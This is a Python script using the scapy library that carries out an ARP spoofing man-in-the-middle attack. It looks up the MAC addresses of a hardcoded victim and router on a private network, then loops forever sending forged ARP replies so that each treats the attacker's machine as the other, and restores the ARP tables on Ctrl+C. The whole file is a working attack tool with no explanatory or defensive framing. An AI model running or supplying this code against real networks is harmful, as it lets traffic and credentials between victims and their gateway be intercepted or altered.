import scapy.all as scapy
import time

def send_arp_packet(destination_ip, source_ip, set_hwsrc=False):
    """
    Sends an ARP packet for spoofing or restoring ARP tables.
    If set_hwsrc is True, hwsrc is explicitly set to the MAC address of source_ip.
    """
    destination_mac = get_mac(destination_ip)
    packet_params = {
        "op": 2,  # ARP reply
        "pdst": destination_ip,  # Target IP
        "hwdst": destination_mac,  # Target MAC
        "psrc": source_ip,  # Source IP
    }
    if set_hwsrc:
        source_mac = get_mac(source_ip)
        packet_params["hwsrc"] = source_mac  # Explicitly set source MAC

    # Build the ARP packet
    packet = scapy.ARP(**packet_params)
    # Wrap in an Ether frame with the correct destination MAC
    ether_frame = scapy.Ether(dst=destination_mac) / packet

    # Debugging: Show details of the packet
    print("[DEBUG] Sending ARP packet:")
    print(packet.show())
    print(packet.summary())

    # Send the packet
    scapy.send(ether_frame, verbose=False, count=4 if set_hwsrc else 1)

def get_mac(ip):
    """
    Retrieves the MAC address for the given IP using an ARP request.
    """
    print(f"[DEBUG] Sending ARP request for IP: {ip}")
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request

    # Debugging: Show details of the ARP request
    print("[DEBUG] ARP request details:")
    print(arp_request_broadcast.show())
    print(arp_request_broadcast.summary())

    answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]

    if answered_list:
        print(f"[DEBUG] Received ARP response for IP: {ip}")
        print(answered_list[0][1].show())
        print(answered_list[0][1].summary())
        return answered_list[0][1].hwsrc
    else:
        raise Exception(f"MAC address not found for IP: {ip}")

# ARP spoofing loop
victim_ip = "172.16.149.163"
router_ip = "172.16.149.2"
sent_packet_counter = 0

try:
    while True:
        print(f"[DEBUG] Spoofing victim ({victim_ip}) to think attacker is the router ({router_ip})")
        send_arp_packet(victim_ip, router_ip)  # Spoof victim

        print(f"[DEBUG] Spoofing router ({router_ip}) to think attacker is the victim ({victim_ip})")
        send_arp_packet(router_ip, victim_ip)  # Spoof router

        sent_packet_counter += 2
        print(f"\r[+] Packets sent: {sent_packet_counter}", end="", flush=True)
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[DEBUG] Detected CTRL + C, restoring ARP tables...")
    # Restore ARP tables
    print(f"[DEBUG] Restoring ARP table for victim ({victim_ip}) and router ({router_ip})")
    send_arp_packet(victim_ip, router_ip, set_hwsrc=True)
    send_arp_packet(router_ip, victim_ip, set_hwsrc=True)
    print("[+] ARP tables restored.")
